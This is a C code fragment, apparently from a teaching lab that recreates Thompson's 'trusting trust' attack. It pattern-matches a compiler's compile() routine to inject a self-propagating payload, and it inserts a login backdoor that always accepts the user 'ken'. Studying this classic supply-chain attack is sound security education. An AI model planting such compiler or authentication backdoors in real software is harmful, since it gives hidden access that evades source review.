
    int compiled_compiler = 0;

    /*****************************************************************
     * Step 2:
     */
    
    // search for the start of the compile routine: 
    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;

    // and inject a placeholder "attack":
    // inject this after the assert above after the call to fopen.
    // not much of an attack.   this is just a quick placeholder.

    char* compile_loc = strstr(program, compile_sig);

    #include "attack-arr.c"

    if (compile_loc) {
        FILE *fp = fopen("./temp-out.c", "w");
        assert(fp);

        char* char_ptr = program;
        
        while (char_ptr != compile_loc) {
            fprintf(fp, "%c", *char_ptr);
            char_ptr++;
        }

        char_ptr += strlen(compile_sig);
        fprintf(fp, "\n%s", compile_sig);
        fprintf(fp, "\n\t%s", compile_attack);

        while (char_ptr != program + strlen(program)) {
            fprintf(fp, "%c", *char_ptr);
            char_ptr++;
        }

        fclose(fp);
    }

 
    // match on the start of the login() routine:
    static char login_sig[] = "int login(char *user) {";

    char* login_loc = strstr(program, login_sig);

    
    // and inject an attack for "ken":
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

    if (login_loc && !compiled_compiler) {
        FILE *fp = fopen("./temp-out.c", "w");
        assert(fp);

        char* char_ptr = program;
        
        while (char_ptr != login_loc) {
            fprintf(fp, "%c", *char_ptr);
            char_ptr++;
        }

        char_ptr += strlen(login_sig);
        fprintf(fp, "\n%s", login_sig);
        fprintf(fp, "\n\t%s", login_attack);

        while (char_ptr != program + strlen(program)) {
            fprintf(fp, "%c", *char_ptr);
            char_ptr++;
        }

        fclose(fp);
    }
    
    /************************************************************
     * don't modify the rest.
     */